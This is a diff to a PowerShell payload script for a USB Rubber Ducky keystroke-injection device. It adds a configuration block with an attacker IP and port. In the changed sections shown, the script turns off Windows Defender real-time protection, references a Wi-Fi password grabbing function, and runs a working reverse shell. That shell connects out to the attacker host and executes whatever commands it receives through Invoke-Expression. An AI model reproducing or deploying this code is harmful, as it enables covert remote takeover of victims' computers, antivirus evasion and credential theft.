@@ -1,6 +1,17 @@
+
+
+#-- Payload configuration --#
+
+$DRIVE = 'DUCKY'          # Drive letter of the USB Rubber Ducky
+$IP = '192.168.31.82'     # IP address of the attacker machine
+$PORT = '8080'            # Port to use for the reverse shell
+
+
 # Set destination directory
-$DUCKY_DRIVE_NAME = "DUCKY" 
-$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq '$DUCKY_DRIVE_NAME' }).DeviceID
+
+
+
+$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
 Set-Location $duckletter
 
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -102,16 +113,18 @@ GetWifiPasswords
 
 # Reverse shell
 function ReverseShell {
-    $ip = 'YOUR_IP'
-    $port = 'YOUR_PORT'
+    param(
+        [string]$ip,
+        [int]$port
+    )
 
     $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535 | % {0}
+    [byte[]]$bytes = 0..65535 | ForEach-Object {0}
     while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
         $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-        $sendback = (iex $data 2>&1 | Out-String)
-        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
+        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
         $stream.Write($sendbyte, 0, $sendbyte.Length)
         $stream.Flush()
@@ -119,7 +132,7 @@ function ReverseShell {
     $client.Close()
 }
 
-ReverseShell
+ReverseShell -ip $IP -port $PORT
 
 # Re-enable Windows Defender real-time monitoring
 Set-MpPreference -DisableRealtimeMonitoring $false
